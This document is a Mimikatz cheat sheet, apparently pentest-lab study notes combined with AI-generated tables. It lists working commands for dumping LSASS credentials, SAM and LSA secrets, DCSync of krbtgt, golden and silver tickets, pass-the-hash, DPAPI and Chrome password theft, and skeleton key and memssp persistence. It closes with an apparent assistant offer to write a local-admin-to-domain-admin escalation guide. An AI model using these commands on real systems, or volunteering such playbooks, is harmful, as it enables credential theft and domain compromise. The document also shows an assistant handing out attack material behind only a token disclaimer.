> [!Attention]
> It is always a good idea to type "log" before running any commands in "Mimikatz" this way all command output will put output to a ".txt" file. This is especially useful when dumping credentials from a server which may have many sets of credentials in memory.

Below is a **full, clean, structured, comprehensive Mimikatz command reference**, organized into clear **tables by functionality** so you can quickly find what you need.

This is **for learning and reference** (not for real-world misuse).  
Each table contains:  
- **Purpose**  
- **Core commands**  
- **Example usage**  
- **Notes**

---
Use ticket from rubeus.exe
```powershell
[IO.File]::WriteAllBytes("C:\path\to\dc01.kirbi", [Convert]::FromBase64String((Get-Content "C:\path\to\ticket.b64")))
mimikatz.exe
kerberos::ptt C:\path\to\dc01.kirbi
```


Things i use:
```powershell
.\mimikatz.exe privilege::debug sekurlsa::msv exit # extract ntlm hash of users, but it needs high privileges
lsadump::dcsync /user:krbtgt /domain:inlanefreight.local

```

---

## **1. General / Basic Operations**

| Purpose | Command | Example | Notes |
|--------|---------|---------|-------|
| Run Mimikatz with elevation | (Run as Administrator) | n/a | Required for almost everything |
| Use basic commands | `privilege::debug` | `privilege::debug` | Needed for LSASS access |
| Use modules | `sekurlsa::logonpasswords` | `sekurlsa::logonpasswords` | Shows creds from memory |
| Exit mimikatz | `exit` | — | — |

---

## **2. Tokens / Privileges**

| Purpose | Command | Example | Notes |
|--------|---------|---------|-------|
| Check privileges | `privilege::debug` | `privilege::debug` | Required for sensitive ops |
| Enable all privileges | `token::elevate` | `token::elevate` | Elevates to SYSTEM if possible |
| List tokens | `token::list` | `token::list` | Shows logon tokens |
| Impersonate a token | `token::impersonate` | `token::impersonate /user:DOMAIN\Admin` | Rarely works without prior capture |

---

## **3. LSA Secrets (Registry Secrets)**

| Purpose | Command | Example | Notes |
|--------|---------|---------|-------|
| Dump LSA secrets | `lsadump::secrets` | `lsadump::secrets` | Requires SYSTEM + registry hives |
| Dump SAM secrets | `lsadump::sam` | `lsadump::sam` | Gets local users' NTLM hashes |
| Offline dump from hives | `lsadump::secrets /system:SYSTEM /security:SECURITY` | `lsadump::sam /system:SYSTEM /sam:SAM` | HTB/DFIR usage |

---

## **4. LSASS Dumping (sekurlsa)**

| Purpose | Command | Example | Notes |
|--------|---------|---------|-------|
| Dump plaintext credentials | `sekurlsa::logonpasswords` | `sekurlsa::logonpasswords` | Most common mimikatz command |
| Dump Kerberos tickets | `sekurlsa::tickets` | `sekurlsa::tickets` | Shows TGTs & TGS |
| Dump cached logon data | `sekurlsa::msv` |  | NTLM credentials |
| Dump WDigest | `sekurlsa::wdigest` |  | Shows plaintext if enabled |
| Dump Kerberos keys | `sekurlsa::kerberos` |  | Shows Kerberos encryption keys |
| Open LSASS dump file | `sekurlsa::minidump <file>` | `sekurlsa::minidump lsass.dmp` | Offline analysis |
| Revert to live LSASS | `sekurlsa::minidump -` | | Exit minidump mode |

---

## **5. Kerberos (Golden Ticket / Silver Ticket)**

| Purpose | Command | Example | Notes |
|--------|---------|---------|-------|
| Create Golden Ticket | `kerberos::golden` | `kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxxx /krbtgt:NTLMHASH /id:500` | Requires krbtgt NTLM hash |
| Create Silver Ticket | `kerberos::silver` | `kerberos::silver /domain:corp.local /sid:... /target:cifs/DC.corp.local /rc4:NTLMHASH /user:svc_backup` | Grants access to specific service |
| Inject ticket | `kerberos::ptt <ticket.kirbi>` | `kerberos::ptt admin.kirbi` | PTT = Pass-the-Ticket |
| List tickets | `kerberos::list` | `kerberos::list` | List tickets in memory |
| Purge tickets | `kerberos::purge` | `kerberos::purge` | Remove all cached tickets |

---

## **6. Pass-the-Hash (PTH)**

| Purpose | Command | Example | Notes |
|--------|---------|---------|-------|
| Run program with NTLM hash | `sekurlsa::pth` | `sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<hash> /run:cmd.exe` | Creates new logon session |
| Use AES keys (Kerberos) | `sekurlsa::pth /aes256:<key>` | — | Works for Kerberos auth where allowed |

---

## **7. DPAPI (Credential Vault / Chrome / Wi-Fi Keys)**

| Purpose | Command | Example | Notes |
|--------|---------|---------|-------|
| Dump DPAPI master keys | `dpapi::masterkey` | `dpapi::masterkey /in:master.key` | Requires user context |
| Dump Chrome passwords | `dpapi::chrome` | `dpapi::chrome /in:Login Data` | Offline |
| Dump Credential Manager | `dpapi::cred` |  | Retrieves saved creds |
| Dump vault | `vault::list` and `vault::cred` | `vault::cred /id:GUID` | Windows Vault |

---

## **8. Certificates (Smart Card, Private Keys)**

| Purpose | Command | Example | Notes |
|--------|---------|---------|-------|
| Dump private certificates | `crypto::certificates` | `crypto::certificates /export` | Exports PFX files |
| Extract master keys | `crypto::keys` | | Useful for smart card emulation |
| Export keys | `crypto::export` | — | Often requires admin |

---

## **9. Skeleton Key Attack**

| Purpose | Command | Example | Notes |
|--------|---------|---------|-------|
| Install skeleton key | `misc::skeleton` | `misc::skeleton` | Makes “mimikatz” password valid for all accounts |
| Remove skeleton key | Reboot DC | — | Not persistent |

---

## **10. Misc / Rarely Used Modules**

| Purpose | Command | Example | Notes |
|--------|---------|---------|-------|
| Duplicator (object cloning) | `misc::cmd` | — | Rarely used |
| Inject SSP for persistent creds | `misc::memssp` | `misc::memssp` | Logs all passwords to event log |
| Export SAM/LSA hashes | `lsadump::cache` | | Cached domain creds |
| NT6 hash extraction | `lsadump::dcsync` | `lsadump::dcsync /domain:corp.local /user:krbtgt` | Requires DC sync rights |

---

## **11. Mimikatz File Output**

| Purpose | Command | Example | Notes |
|--------|---------|---------|-------|
| Save output to file | `log <filename>` | `log dump.txt` | Logs everything |
| Stop logging | `log` | — | — |

---

# 🟩 **12. Quick Reference “Cheat Sheet” Table**

| Goal | Command |
|------|---------|
| Dump passwords from LSASS | `sekurlsa::logonpasswords` |
| Dump NTLM hashes | `lsadump::sam` |
| Dump domain hashes (DCSync) | `lsadump::dcsync /user:krbtgt` |
| Dump tickets | `sekurlsa::tickets` |
| Pass-the-Ticket | `kerberos::ptt <ticket>` |
| Pass-the-Hash | `sekurlsa::pth /user:U /domain:D /ntlm:H /run:cmd.exe` |
| Make Golden Ticket | `kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5... /krbtgt:<hash> /id:500` |
| Enable debug rights | `privilege::debug` |
| Read offline hives | `lsadump::sam /system:SYSTEM /sam:SAM` |
| Dump certificates | `crypto::certificates /export` |

---

# If you want, I can also generate:
✔ A one-page **Mimikatz cheat sheet PDF**  
✔ A **printable table**  
✔ A **Markdown sheet**  
✔ A **use-case-driven guide** (e.g., "How to escalate from local admin to domain admin using Mimikatz")  

Just tell me the format you prefer.